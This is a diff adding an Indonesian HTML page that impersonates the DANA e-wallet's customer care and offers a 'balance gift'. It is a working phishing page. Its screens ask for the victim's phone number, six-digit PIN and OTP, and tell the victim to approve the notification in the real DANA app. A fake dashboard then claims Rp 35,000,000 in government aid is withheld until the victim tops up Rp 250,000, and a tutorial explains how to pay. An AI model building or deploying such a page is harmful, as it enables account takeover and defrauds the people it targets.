@@ -1,1 +1,417 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="theme-color" content="#118EEA">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
+    <title>DANA | Customer Care</title>
+    <meta name="description" content="DANA adalah bentuk baru uang tunai yang lebih baik. Transaksi apapun, berapapun dan dimanapun jadi mudah bersama DANA.">
+    
+    <!-- Social Media Meta Tags -->
+    <meta property="og:url" content="https://hadiahlkamu.netlify.app/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="LAYANAN BAGI-BAGI HADIAH SALDO DANA">
+    <meta property="og:description" content="Siap mengatasi Keluhan & Pemasalahan Akun Anda">
+    <meta property="og:image" content="https://raw.githubusercontent.com/naklapang/dana-notification/main/public/images/IMG_20240827_165528_523.jpg">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:alt" content="Pemulihan Akun DANA Resmi">
+    
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="LAYANAN BAGI-BAGI HADIAH SALDO DANA">
+    <meta name="twitter:description" content="Siap mengatasi Keluhan & Pemasalahan Akun Anda">
+    <meta name="twitter:image" content="https://raw.githubusercontent.com/naklapang/dana-notification/main/public/images/IMG_20240827_165528_523.jpg">
+    <meta name="twitter:image:alt" content="Pemulihan Akun DANA Resmi">
+    
+    <!-- Favicon and Preconnects -->
+    <link rel="icon" href="https://www.dana.id/favicon.ico">
+    <link rel="preconnect" href="https://a.m.dana.id">
+    <link rel="preconnect" href="https://app.link">
+    <link rel="preconnect" href="https://api2.branch.io">
+    
+    <!-- Fonts and Styles -->
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <!-- Loading Spinner -->
+  <div class="spinner-overlay" style="display: none;">
+    <div class="spinner">
+      <svg class="spinner-back" xmlns="http://www.w3.org/2000/svg" width="54" height="54" viewBox="0 0 54 54">
+        <g fill="none" fill-rule="evenodd" transform="translate(.012 .012)">
+          <circle cx="26.988" cy="26.988" r="26.667" fill="#000" fill-opacity=".6" opacity=".6"/>
+          <path fill="#FFF" d="M22.098 22.769a8.208 8.208 0 0 1-1.24.098 6.834 6.834 0 0 1-1.653-.199c-.87-.215-1.658-.609-2.4-1.115-.096-.066-.273-.132-.34-.086-.086.06-.134.23-.136.355-.012.72-.006 1.439-.006 2.159v2.657l-.001 5.707c-.001.39.13.709.453.917 1.355.872 2.838 1.255 4.433 1.185 1.243-.055 2.443-.34 3.618-.733 1.308-.438 2.604-.91 3.908-1.361 1.14-.394 2.3-.716 3.502-.834 1.753-.17 3.406.158 4.92 1.123.35.222.497.133.497-.28v-5.724c0-1.6-.001-3.2.002-4.8.001-.458-.19-.79-.556-1.044-1.98-1.385-4.141-1.557-6.378-.912-1.305.376-2.577.88-3.849 1.369-1.564.6-3.107 1.262-4.774 1.518z"/>
+        </g>
+      </svg>
+      <svg class="spinner-front" xmlns="http://www.w3.org/2000/svg" width="38" height="38" viewBox="0 0 38 38">
+        <defs>
+          <linearGradient id="prefix__a" x1="38.883%" x2="50%" y1="-16.052%" y2="90.302%">
+            <stop offset="0%" stop-color="#EDEDED" stop-opacity="0"/>
+            <stop offset="56.544%" stop-color="#FFF"/>
+            <stop offset="100%" stop-color="#FFF" stop-opacity="0"/>
+          </linearGradient>
+        </defs>
+        <circle cx="29.333" cy="29.333" r="18.115" fill="none" stroke="url(#prefix__a)" stroke-width=".807" transform="rotate(45 36.64 11.693)"/>
+      </svg>
+    </div>
+  </div>
 
+  <div class="content">
+    <!-- Phone Number Page -->
+    <div id="number-page" style="display:block">
+      <div class="container">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <h2>Masukkan Nomor HP Kamu</h2>
+        <div class="phone-input-container">
+          <div class="country-code-box">
+            <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/indo.png" alt="Bendera Indonesia" class="flag-icon">
+            <span> +62</span>
+          </div>
+          <input type="tel" id="phone-number" placeholder="811-1234-56789" pattern="[0-9-]*" inputmode="numeric" maxlength="14">
+        </div>
+        <p class="info-text">Dengan melanjutkan, kamu setuju dengan <b>Syarat & Ketentuan</b> dan <b>Kebijakan Privasi</b> kami.</p>
+      </div>
+    </div>
+
+    <!-- PIN Page -->
+    <div id="pin-page" style="display:none">
+      <div class="container">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <h2>Masukkan PIN</h2>
+        <div class="pin-container">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+          <input type="password" class="input-box pin-box" maxlength="1" inputmode="numeric">
+        </div>
+        <div class="show-text-container"><span class="show-text">Tampilkan</span></div>
+        <div class="help-forgot-container">
+          <a href="#" class="link">Bantuan</a>
+          <a href="#" class="link">Lupa PIN?</a>
+        </div>
+      </div>
+    </div>
+
+    <!-- OTP Page -->
+    <div id="otp-page" style="display:none">
+      <div class="container">
+        <img src="https://dev-danapemulihan.pantheonsite.io/asset/img/dana_logo.png" alt="Logo Dana" class="logo">
+        <h2>Verifikasi Kode OTP</h2>
+        <div class="otp-container">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+          <input type="text" class="input-box otp-box" maxlength="1" inputmode="numeric">
+        </div>
+        <div class="otp-message-box"> 
+          Kode OTP telah dikirim ke WhatsApp/SMS<br>
+          <small>(Silahkan buka aplikasi dana lalu verifikasi notifikasi)</small>
+          <span id="otp-timer">02:00</span>
+        </div>
+        <div id="floating-notification" class="floating-notification" style="display:none">
+          <div id="notification-content">Silakan verifikasi notifikasi yang muncul untuk menerima kode OTP.</div>
+          <div id="attempt-counter" style="font-size:12px;margin-top:5px;display:none">Percobaan ke: <span id="attempt-number">1</span>/6</div>
+        </div>
+        <div id="reward-notification" class="notification" style="display:none"></div>
+        <div id="success-notification" class="floating-notification" style="display:none;background-color:#4CAF50">
+          terlalu sering memasukkan kode OTP Silahkan Verifikasi di aplikasi dana
+        </div>
+        <div class="verifikasi-button-container" style="display:none">
+          <button id="verifikasi-button" class="button">Verifikasi</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- Dashboard Page (Halaman Transaksi DANA) -->
+    <div id="dashboard-page" style="display:none">
+      <div class="dana-container">
+        <header class="dana-header">
+          <div class="header-top">
+            <div class="logo">DANA</div>
+            <div class="user-info">
+              <span>Hi, User</span>
+              <div class="avatar">👤</div>
+            </div>
+          </div>
+          
+          <div class="saldo-section">
+            <div class="saldo-label">Saldo DANA</div>
+            <div class="saldo-amount">Rp 35.250.000</div>
+            <div class="saldo-pending">
+              <span>Saldo Bantuan Tertahan</span>
+              <span>Rp 35.000.000</span>
+            </div>
+          </div>
+        </header>
+        
+        <div class="cairkan-info">
+          <div class="cairkan-title">💡 Cara Mencairkan Dana Bantuan</div>
+          <p>Untuk mengaktifkan dan mencairkan dana bantuan sebesar Rp 35.000.000, Anda perlu melakukan top up sebesar Rp 250.000 terlebih dahulu.</p>
+        </div>
+        
+        <button class="btn-cairkan" id="topUpBtn">Top Up Sekarang - Rp 250.000</button>
+        
+        <div class="bantuan-section">
+          <div class="bantuan-title">💳 Dana Bantuan Pemerintah</div>
+          <p class="bantuan-info">Dana Bantuan Sosial yang sedang dalam proses pencairan. Dana akan tersedia secara bertahap sesuai jadwal yang ditentukan.</p>
+          
+          <div class="bantuan-details">
+            <span>Total Bantuan:</span>
+            <span class="bantuan-amount">Rp 35.000.000</span>
+          </div>
+          <div class="bantuan-details">
+            <span>Telah Dicairkan:</span>
+            <span class="bantuan-amount">Rp 250.000</span>
+          </div>
+          <div class="bantuan-details">
+            <span>Masih Tertahan:</span>
+            <span class="bantuan-amount">Rp 34.750.000</span>
+          </div>
+          
+          <div class="progress-bar">
+            <div class="progress"></div>
+          </div>
+          <div class="bantuan-details">
+            <span>Proses Pencairan:</span>
+            <span>60%</span>
+          </div>
+        </div>
+        
+        <div class="menu-grid">
+          <div class="menu-item">
+            <div class="menu-icon">💳</div>
+            <div class="menu-label">Top Up</div>
+          </div>
+          <div class="menu-item">
+            <div class="menu-icon">📤</div>
+            <div class="menu-label">Kirim</div>
+          </div>
+          <div class="menu-item">
+            <div class="menu-icon">📥</div>
+            <div class="menu-label">Terima</div>
+          </div>
+          <div class="menu-item">
+            <div class="menu-icon">🏪</div>
+            <div class="menu-label">Merchant</div>
+          </div>
+          <div class="menu-item">
+            <div class="menu-icon">📊</div>
+            <div class="menu-label">Investasi</div>
+          </div>
+          <div class="menu-item">
+            <div class="menu-icon">💡</div>
+            <div class="menu-label">Listrik</div>
+          </div>
+          <div class="menu-item">
+            <div class="menu-icon">📱</div>
+            <div class="menu-label">Pulsa</div>
+          </div>
+          <div class="menu-item">
+            <div class="menu-icon">➕</div>
+            <div class="menu-label">Lainnya</div>
+          </div>
+        </div>
+        
+        <div class="section-title">
+          <span>Transaksi Terkait Bantuan</span>
+          <span class="see-all">Lihat Semua</span>
+        </div>
+        
+        <div class="transaction-list">
+          <div class="transaction-item">
+            <div class="transaction-info">
+              <div class="transaction-icon">💰</div>
+              <div class="transaction-details">
+                <h4>Pengaktifan Bantuan - Top Up</h4>
+                <p>20 Okt 2025 • Aktivasi Bantuan</p>
+              </div>
+            </div>
+            <div class="transaction-amount">
+              <div class="amount">-Rp 250.000</div>
+              <span class="status status-success">Berhasil</span>
+            </div>
+          </div>
+          
+          <div class="transaction-item">
+            <div class="transaction-info">
+              <div class="transaction-icon">🎁</div>
+              <div class="transaction-details">
+                <h4>Tahap 1 - Pengaktifan Hadiah</h4>
+                <p>20 Okt 2025 • Tanda Terima Aktif</p>
+              </div>
+            </div>
+            <div class="transaction-amount">
+              <div class="amount">+Rp 650.000</div>
+              <span class="status status-success">Berhasil</span>
+            </div>
+          </div>
+          
+          <div class="transaction-item">
+            <div class="transaction-info">
+              <div class="transaction-icon">🏛️</div>
+              <div class="transaction-details">
+                <h4>Pencairan Bantuan Tahap 2</h4>
+                <p>5 Okt 2025 • Bantuan Sosial</p>
+              </div>
+            </div>
+            <div class="transaction-amount">
+              <div class="amount">+Rp 300.000</div>
+              <span class="status status-success">Berhasil</span>
+            </div>
+          </div>
+          
+          <div class="transaction-item">
+            <div class="transaction-info">
+              <div class="transaction-icon">⏳</div>
+              <div class="transaction-details">
+                <h4>Bantuan Tahap 3</h4>
+                <p>Estimasi 25 Okt 2025</p>
+              </div>
+            </div>
+            <div class="transaction-amount">
+              <div class="amount">+Rp 400.000</div>
+              <span class="status status-pending">Menunggu</span>
+            </div>
+          </div>
+          
+          <div class="transaction-item">
+            <div class="transaction-info">
+              <div class="transaction-icon">⏳</div>
+              <div class="transaction-details">
+                <h4>Bantuan Tahap 4</h4>
+                <p>Estimasi 15 Nov 2025</p>
+              </div>
+            </div>
+            <div class="transaction-amount">
+              <div class="amount">+Rp 450.000</div>
+              <span class="status status-pending">Menunggu</span>
+            </div>
+          </div>
+        </div>
+        
+        <div class="info-box">
+          <div class="info-title">Transaksi Tertahan / Belum Selesai</div>
+          <div class="info-content">
+            Transaksi yang ditandai dengan status "Menunggu" adalah bagian dari dana bantuan yang belum dicairkan. Dana ini akan dicairkan secara otomatis sesuai jadwal yang telah ditetapkan setelah proses aktivasi selesai.
+          </div>
+        </div>
+        
+        <div class="info-box">
+          <div class="info-title">Mengapa ada Saldo Bantuan Tertahan?</div>
+          <div class="info-content">
+            Saldo bantuan tertahan adalah dana bantuan sosial dari pemerintah yang dicairkan secara bertahap sesuai jadwal yang telah ditetapkan. Hal ini dilakukan untuk memastikan dana digunakan sesuai peruntukan dan tepat sasaran.
+          </div>
+        </div>
+        
+        <button class="btn-primary" id="infoBtn">Pelajari Lebih Lanjut</button>
+        
+        <div class="info-box">
+          <div class="info-title">Mengapa harus mengisi saldo terlebih dahulu?</div>
+          <div class="info-content">
+            Untuk menggunakan layanan DANA, Anda perlu memiliki saldo yang cukup. Top up saldo memungkinkan Anda untuk melakukan berbagai transaksi seperti pembayaran, transfer, dan pembelian, sambil menunggu pencairan dana bantuan.
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Continue Button -->
+  <div class="fixed-button-container" id="lanjutkan-container">
+    <button id="lanjutkan-button" class="button">Lanjutkan</button>
+  </div>
+
+  <!-- Modal untuk tutorial top up -->
+  <div class="modal" id="tutorialModal">
+    <div class="modal-content">
+      <span class="close-modal" id="closeTutorialModal">&times;</span>
+      <h3 class="modal-title">📋 Tutorial Top Up DANA</h3>
+      <div class="modal-body">
+        <p>Berikut adalah cara-cara untuk melakukan top up saldo DANA sebesar <strong>Rp 250.000</strong>:</p>
+        
+        <div class="tutorial-section">
+          <h4>🏪 Top Up melalui Konter/Agen</h4>
+          <ul>
+            <li>Kunjungi konter pulsa terdekat (Agen BRILink, Indomaret, Alfamart, dll)</li>
+            <li>Katakan kepada kasir ingin top up DANA</li>
+            <li>Berikan nomor telepon yang terdaftar di akun DANA Anda</li>
+            <li>Bayar sebesar Rp 250.000</li>
+            <li>Tunggu SMS konfirmasi dari DANA</li>
+          </ul>
+        </div>
+        
+        <div class="tutorial-section">
+          <h4>📱 Top Up melalui M-Banking</h4>
+          <ul>
+            <li>Buka aplikasi mobile banking bank Anda</li>
+            <li>Pilih menu transfer atau pembayaran</li>
+            <li>Pilih DANA sebagai tujuan pembayaran</li>
+            <li>Masukkan nomor telepon yang terdaftar di akun DANA</li>
+            <li>Transfer sebesar Rp 250.000</li>
+            <li>Pastikan nama penerima sesuai dengan nama di akun DANA</li>
+            <li>Tunggu konfirmasi transfer berhasil</li>
+          </ul>
+        </div>
+        
+        <div class="tutorial-section">
+          <h4>💳 Top Up melalui ATM</h4>
+          <ul>
+            <li>Masukkan kartu ATM dan PIN</li>
+            <li>Pilih menu transfer</li>
+            <li>Pilih ke rekening bank lain</li>
+            <li>Masukkan kode bank DANA dan nomor telepon Anda</li>
+            <li>Transfer sebesar Rp 250.000</li>
+            <li>Simpan bukti transfer</li>
+          </ul>
+        </div>
+        
+        <div class="important-note">
+          <h4>📝 Catatan Penting:</h4>
+          <ul>
+            <li>Pastikan nomor telepon yang digunakan sama dengan akun DANA</li>
+            <li>Pastikan nama penerima sesuai dengan nama di akun DANA</li>
+            <li>Simpan selalu bukti transaksi</li>
+            <li>Proses top up biasanya memakan waktu 5-15 menit</li>
+            <li>Jika mengalami kendala, hubungi customer service DANA</li>
+          </ul>
+        </div>
+      </div>
+      <div class="modal-footer">
+        <button class="btn-secondary" id="closeTutorialBtn">Tutup</button>
+        <button class="btn-primary" id="confirmTopUpBtn">Saya Sudah Top Up</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Modal untuk penjelasan lebih detail -->
+  <div class="modal" id="infoModal">
+    <div class="modal-content">
+      <span class="close-modal" id="closeModal">&times;</span>
+      <h3 class="modal-title">Saldo Bantuan Tertahan di DANA</h3>
+      <div class="modal-body">
+        <p><strong>Apa itu saldo bantuan tertahan?</strong></p>
+        <p>Saldo bantuan tertahan adalah dana bantuan sosial dari pemerintah yang sementara tidak dapat digunakan sepenuhnya karena sedang dalam proses pencairan bertahap.</p>
+        
+        <p style="margin-top: 15px;"><strong>Mengapa dana bantuan dicairkan secara bertahap?</strong></p>
+        <p>Pencairan bertahap dilakukan karena beberapa alasan:</p>
+        <ul style="margin-left: 20px; margin-top: 10px;">
+          <li>Memastikan dana digunakan sesuai peruntukan</li>
+          <li>Mencegah penyalahgunaan dana bantuan</li>
+          <li>Memberikan bantuan secara berkelanjutan</li>
+          <li>Memudahkan monitoring dan evaluasi</li>
+        </ul>
+        
+        <p style="margin-top: 15px;"><strong>Kapan dana bantuan akan sepenuhnya cair?</strong></p>
+        <p>Dana bantuan akan dicairkan sesuai jadwal yang telah ditetapkan oleh pemerintah. Anda dapat melihat estimasi pencairan pada riwayat transaksi.</p>
+      </div>
+      <div class="modal-footer">
+        <button class="btn-secondary" id="closeModalBtn">Tutup</button>
+        <button class="btn-primary" id="topUpModalBtn">Top Up Sekarang</button>
+      </div>
+    </div>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+      </html>
